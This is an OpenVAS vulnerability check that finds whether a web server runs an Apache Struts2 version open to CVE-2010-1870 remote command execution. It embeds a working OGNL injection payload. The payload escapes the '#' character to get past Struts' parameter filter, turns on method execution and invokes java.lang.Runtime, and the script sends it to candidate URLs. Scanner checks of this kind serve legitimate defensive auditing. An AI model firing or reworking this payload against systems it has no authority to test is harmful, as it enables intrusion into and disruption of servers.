##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_apache_struts_xwork_cmd_exec_vuln.nasl 14 2013-10-27 12:33:37Z jan $
#
# Apache Struts2/XWork Remote Command Execution Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attackers to manipulate server-side context
  objects with the privileges of the user running the application.
  Impact Level: Application.";
tag_affected = "Struts version 2.0.0 through 2.1.8.1";

tag_insight = "The flaw is due to an error in 'OGNL' extensive expression evaluation
  capability in XWork in Struts, uses as permissive whitelist, which allows
  remote attackers to modify server-side context objects and bypass the '#'
  protection mechanism in ParameterInterceptors via various varibles.";
tag_solution = "Upgrade to Struts version 2.2 or later
  For updates refer to http://struts.apache.org/download.cgi";
tag_summary = "This host is running Struts and is prone to remote command
  execution vulnerability.";

if(description)
{
  script_id(801663);
  script_version("$Revision: 14 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2010-12-21 15:42:46 +0100 (Tue, 21 Dec 2010)");
  script_cve_id("CVE-2010-1870");
  script_bugtraq_id(41592);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_name("Apache Struts2/XWork Remote Command Execution Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "
  Affected Software/OS:
  " + tag_affected + "
  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://osvdb.org/66280");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/14360/");
  script_xref(name : "URL" , value : "http://struts.apache.org/2.2.1/docs/s2-005.html");
  script_xref(name : "URL" , value : "http://blog.o0o.nu/2010/07/cve-2010-1870-struts2xwork-remote.html");

  script_description(desc);
  script_summary("Check if Struts is vulnerable to Remote Command Execution");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2010 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 8080);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:8080);
if(!get_port_state(port)){
  exit(0);
}

## OGNL (Object Graph Navigation Language)
ognl="?('\u0023_memberAccess[\'allowStaticMethodAccess\']')(meh)=true&(aaa)(('"+
     "\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003d\u0023" +
     "foo')(\u0023foo\u003dnew%20java.lang.Boolean('false')))&(asdf)(('\u0023" +
     "rt.exit(1)')(\u0023rt\u003d@java.lang.Runtime@getRuntime()))=1";

foreach dir (make_list("/", "/struts/", "/struts2-blank/", "/struts-blank/"))
{
  ## Send and Recieve the response
  req = http_get(item:string(dir,"example/HelloWorld.action"), port:port);
  res = http_keepalive_send_recv(port:port, data:req);

  ## Confirm the application
  if("<title>Struts" >< res)
  {
    ## Construct attack request
    url = string(dir,"example/HelloWorld.action",ognl);

    ## Try attack and check the response to confirm vulnerability
    if(http_vuln_check(port:port, url:url,
       pattern:'<a href=".*xwork.MethodAccessor.denyMethodExecution',
       check_header: TRUE))
    {
      security_warning(port);
      exit(0);
    }
  }
}
